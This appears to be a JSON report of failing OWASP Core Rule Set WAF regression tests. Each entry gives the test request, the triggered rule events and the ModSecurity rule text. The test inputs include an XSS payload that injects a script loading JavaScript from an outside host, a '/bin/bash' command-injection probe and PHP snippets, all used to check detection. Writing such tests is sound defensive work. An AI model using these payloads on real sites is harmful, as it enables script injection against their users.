    "tested_rule" : [ "SecRule ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@* \"@rx \\xac\\xed\\x00\\x05\" \"id:944200,\\\n  phase:2,\\\n  block,\\\n  msg:'Magic bytes Detected,\\\n   probable java serialization in use',\\\n  logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}',\\\n  tag:'application-multi',\\\n  tag:'language-java',\\\n  tag:'platform-multi',\\\n  tag:'attack-rce',\\\n  tag:'paranoia-level/2',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-JAVA',\\\n  tag:'capec/1000/152/248',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.rce_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "949110",
    "test_id" : 1,
    "test_path" : "REQUEST-949-BLOCKING-EVALUATION/949110.yaml",
    "description" : "Test is basically identical to 941100-1 (XSS positive test in phase 2) but here we assert that the inbound blocking mechanism is triggered",
    "cause" : "failed expect_id check: 949110 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=934100 - Node.js Injection Attack 1/2", "phase=2 rule_id=934100 - Node.js Injection Attack 1/2", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941110 - XSS Filter - Category 1: Script Tag Vector", "phase=2 rule_id=941110 - XSS Filter - Category 1: Script Tag Vector", "phase=2 rule_id=941130 - XSS Filter - Category 3: Attribute Vector", "phase=2 rule_id=941130 - XSS Filter - Category 3: Attribute Vector", "phase=2 rule_id=941160 - NoScript XSS InjectionChecker: HTML Injection", "phase=2 rule_id=941160 - NoScript XSS InjectionChecker: HTML Injection", "phase=2 rule_id=941170 - NoScript XSS InjectionChecker: Attribute Injection", "phase=2 rule_id=941170 - NoScript XSS InjectionChecker: Attribute Injection", "phase=2 rule_id=941210 - Javascript Word Detected", "phase=2 rule_id=941210 - Javascript Word Detected", "phase=2 rule_id=941390 - Javascript method detected", "phase=2 rule_id=941390 - Javascript method detected", "phase=2 rule_id=941150 - XSS Filter - Category 5: Disallowed HTML Attributes", "phase=2 rule_id=941150 - XSS Filter - Category 5: Disallowed HTML Attributes", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=941330 - IE XSS Filters - Attack Detected", "phase=2 rule_id=941330 - IE XSS Filters - Attack Detected", "phase=2 rule_id=941340 - IE XSS Filters - Attack Detected", "phase=2 rule_id=941340 - IE XSS Filters - Attack Detected", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942180 - Detects basic SQL authentication bypass attempts 1/3", "phase=2 rule_id=942180 - Detects basic SQL authentication bypass attempts 1/3", "phase=2 rule_id=942340 - Detects basic SQL authentication bypass attempts 3/3", "phase=2 rule_id=942340 - Detects basic SQL authentication bypass attempts 3/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942490 - Detects classic SQL injection probings 3/3", "phase=2 rule_id=942490 - Detects classic SQL injection probings 3/3", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "Test is basically identical to 941100-1 (XSS positive test in phase 2) but here we assert that the inbound blocking mechanism is triggered",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "uri" : "/get/demo/xss/xml/vuln.xml.php?input=<script+xmlns=\"http://www.w3.org/1999/xhtml\">setTimeout(\"top.frame2.location=\"javascript:(function+()+{var+x+=+document.createElement(\\\\\"script\\\\\");x.src+=+\\\\\"//sdl.me/popup.js?//\\\\\";document.childNodes\\\\[0\\\\].appendChild(x);}());\"\",1000)</script>&//",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 949110 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule TX:BLOCKING_INBOUND_ANOMALY_SCORE \"@ge %{tx.inbound_anomaly_score_threshold}\" \"id:949110,\\\n  phase:2,\\\n  deny,\\\n  t:none,\\\n  msg:'Inbound Anomaly Score Exceeded (Total Score: %{TX.BLOCKING_INBOUND_ANOMALY_SCORE})',\\\n  tag:'anomaly-evaluation',\\\n  tag:'OWASP_CRS',\\\n  ver:'OWASP_CRS/4.22.0-dev'\"" ]
  }, {
    "test_rule" : "949110",
    "test_id" : 4,
    "test_path" : "REQUEST-949-BLOCKING-EVALUATION/949110.yaml",
    "description" : "Test is basically identical to 920100-10 (protocol enforcement positive test in phase 1) but here we assert that inbound blocking mechanism is triggered",
    "cause" : "failed expect_id check: 949110 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=911100 - Method is not allowed by policy", "phase=1 rule_id=920100 - Invalid HTTP Request Line" ]
    },
    "test" : {
      "test_id" : 4,
      "desc" : "Test is basically identical to 920100-10 (protocol enforcement positive test in phase 1) but here we assert that inbound blocking mechanism is triggered",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "REALLYLONGUNREALMETHOD",
          "port" : 80,
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 949110 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule TX:BLOCKING_INBOUND_ANOMALY_SCORE \"@ge %{tx.inbound_anomaly_score_threshold}\" \"id:949110,\\\n  phase:2,\\\n  deny,\\\n  t:none,\\\n  msg:'Inbound Anomaly Score Exceeded (Total Score: %{TX.BLOCKING_INBOUND_ANOMALY_SCORE})',\\\n  tag:'anomaly-evaluation',\\\n  tag:'OWASP_CRS',\\\n  ver:'OWASP_CRS/4.22.0-dev'\"" ]
  }, {
    "test_rule" : "949110",
    "test_id" : 5,
    "test_path" : "REQUEST-949-BLOCKING-EVALUATION/949110.yaml",
    "description" : "Test is basically identical to 949110-0 (see above) but here we assert that the scores are summed up and reported properly",
    "cause" : "nothing checked for test 5",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=934100 - Node.js Injection Attack 1/2", "phase=2 rule_id=934100 - Node.js Injection Attack 1/2", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941110 - XSS Filter - Category 1: Script Tag Vector", "phase=2 rule_id=941110 - XSS Filter - Category 1: Script Tag Vector", "phase=2 rule_id=941130 - XSS Filter - Category 3: Attribute Vector", "phase=2 rule_id=941130 - XSS Filter - Category 3: Attribute Vector", "phase=2 rule_id=941160 - NoScript XSS InjectionChecker: HTML Injection", "phase=2 rule_id=941160 - NoScript XSS InjectionChecker: HTML Injection", "phase=2 rule_id=941170 - NoScript XSS InjectionChecker: Attribute Injection", "phase=2 rule_id=941170 - NoScript XSS InjectionChecker: Attribute Injection", "phase=2 rule_id=941210 - Javascript Word Detected", "phase=2 rule_id=941210 - Javascript Word Detected", "phase=2 rule_id=941390 - Javascript method detected", "phase=2 rule_id=941390 - Javascript method detected", "phase=2 rule_id=941150 - XSS Filter - Category 5: Disallowed HTML Attributes", "phase=2 rule_id=941150 - XSS Filter - Category 5: Disallowed HTML Attributes", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=941330 - IE XSS Filters - Attack Detected", "phase=2 rule_id=941330 - IE XSS Filters - Attack Detected", "phase=2 rule_id=941340 - IE XSS Filters - Attack Detected", "phase=2 rule_id=941340 - IE XSS Filters - Attack Detected", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942180 - Detects basic SQL authentication bypass attempts 1/3", "phase=2 rule_id=942180 - Detects basic SQL authentication bypass attempts 1/3", "phase=2 rule_id=942340 - Detects basic SQL authentication bypass attempts 3/3", "phase=2 rule_id=942340 - Detects basic SQL authentication bypass attempts 3/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942490 - Detects classic SQL injection probings 3/3", "phase=2 rule_id=942490 - Detects classic SQL injection probings 3/3", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 5,
      "desc" : "Test is basically identical to 949110-0 (see above) but here we assert that the scores are summed up and reported properly",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "uri" : "/get/demo/xss/xml/vuln.xml.php?input=<script+xmlns=\"http://www.w3.org/1999/xhtml\">setTimeout(\"top.frame2.location=\"javascript:(function+()+{var+x+=+document.createElement(\\\\\"script\\\\\");x.src+=+\\\\\"//sdl.me/popup.js?//\\\\\";document.childNodes\\\\[0\\\\].appendChild(x);}());\"\",1000)</script>&//",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "match_regex" : "Inbound Anomaly Score Exceeded \\(Total Score: "
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule TX:BLOCKING_INBOUND_ANOMALY_SCORE \"@ge %{tx.inbound_anomaly_score_threshold}\" \"id:949110,\\\n  phase:2,\\\n  deny,\\\n  t:none,\\\n  msg:'Inbound Anomaly Score Exceeded (Total Score: %{TX.BLOCKING_INBOUND_ANOMALY_SCORE})',\\\n  tag:'anomaly-evaluation',\\\n  tag:'OWASP_CRS',\\\n  ver:'OWASP_CRS/4.22.0-dev'\"" ]
  }, {
    "test_rule" : "959100",
    "test_id" : 2,
    "test_path" : "RESPONSE-959-BLOCKING-EVALUATION/959100.yaml",
    "description" : "Test is basically identical to 953120-1 (PHP leakage negative test in phase 4) but here we assert that the outbound blocking mechanism is not triggered",
    "cause" : "failed no_expect_ids check: 959100 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=4 rule_id=959100 - Outbound Anomaly Score Exceeded (Total Score: 0)" ]
    },
    "test" : {
      "test_id" : 2,
      "desc" : "Test is basically identical to 953120-1 (PHP leakage negative test in phase 4) but here we assert that the outbound blocking mechanism is not triggered",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "version" : "HTTP/1.1",
          "uri" : "/reflect",
          "data" : "{\"body\": \"<?php12345\"}"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 959100 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule TX:BLOCKING_OUTBOUND_ANOMALY_SCORE \"@ge %{tx.outbound_anomaly_score_threshold}\" \"id:959100,\\\n  phase:4,\\\n  deny,\\\n  t:none,\\\n  msg:'Outbound Anomaly Score Exceeded (Total Score: %{tx.blocking_outbound_anomaly_score})',\\\n  tag:'anomaly-evaluation',\\\n  tag:'OWASP_CRS',\\\n  ver:'OWASP_CRS/4.22.0-dev'\"" ]
  }, {
    "test_rule" : "959100",
    "test_id" : 3,
    "test_path" : "RESPONSE-959-BLOCKING-EVALUATION/959100.yaml",
    "description" : "Test is basically identical to 959100-1 (see above) but here we assert that the scores are summed up and reported properly",
    "cause" : "nothing checked for test 3",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=4 rule_id=953120 - PHP source code leakage", "phase=4 rule_id=959100 - Outbound Anomaly Score Exceeded (Total Score: 0)" ]
    },
    "test" : {
      "test_id" : 3,
      "desc" : "Test is basically identical to 959100-1 (see above) but here we assert that the scores are summed up and reported properly",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "version" : "HTTP/1.1",
          "uri" : "/reflect",
          "data" : "{\"body\": \"<?php echo \\\"Hello World!\\n\\\" ?>\"}"
        },
        "output" : {
          "log" : {
            "match_regex" : "Outbound Anomaly Score Exceeded \\(Total Score: "
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule TX:BLOCKING_OUTBOUND_ANOMALY_SCORE \"@ge %{tx.outbound_anomaly_score_threshold}\" \"id:959100,\\\n  phase:4,\\\n  deny,\\\n  t:none,\\\n  msg:'Outbound Anomaly Score Exceeded (Total Score: %{tx.blocking_outbound_anomaly_score})',\\\n  tag:'anomaly-evaluation',\\\n  tag:'OWASP_CRS',\\\n  ver:'OWASP_CRS/4.22.0-dev'\"" ]
  }, {
    "test_rule" : "980170",
    "test_id" : 1,
    "test_path" : "RESPONSE-980-CORRELATION/980170.yaml",
    "description" : "Test is similar to 920350-1 but here we check if at reporting level 4 a request is logged that was blocked",
    "cause" : "failed expect_id check: 980170 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920350 - Host header is a numeric IP address", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932160 - Remote Command Execution: Unix Shell Code Found", "phase=2 rule_id=932160 - Remote Command Execution: Unix Shell Code Found", "phase=2 rule_id=932236 - Remote Command Execution: Unix Command Injection (command without evasion)", "phase=2 rule_id=932236 - Remote Command Execution: Unix Command Injection (command without evasion)" ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "Test is similar to 920350-1 but here we check if at reporting level 4 a request is logged that was blocked",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "127.0.0.1",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/get?a=/bin/bash",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "retry_once" : true,
          "log" : {
            "expect_ids" : [ 980170 ]
          }
        }
      } ]
    },
    "tested_rule" : null
  }, {
    "test_rule" : "980170",
    "test_id" : 2,
    "test_path" : "RESPONSE-980-CORRELATION/980170.yaml",
    "description" : "Test is similar to 920350-1 but here we check if at reporting level 4 a request is logged that scored but was not blocked",
    "cause" : "failed expect_id check: 980170 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920350 - Host header is a numeric IP address" ]
    },
    "test" : {
      "test_id" : 2,
      "desc" : "Test is similar to 920350-1 but here we check if at reporting level 4 a request is logged that scored but was not blocked",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "127.0.0.1",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/get",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "retry_once" : true,
          "log" : {
            "expect_ids" : [ 980170 ]
          }
        }
      } ]
    },
    "tested_rule" : null
  } ]
}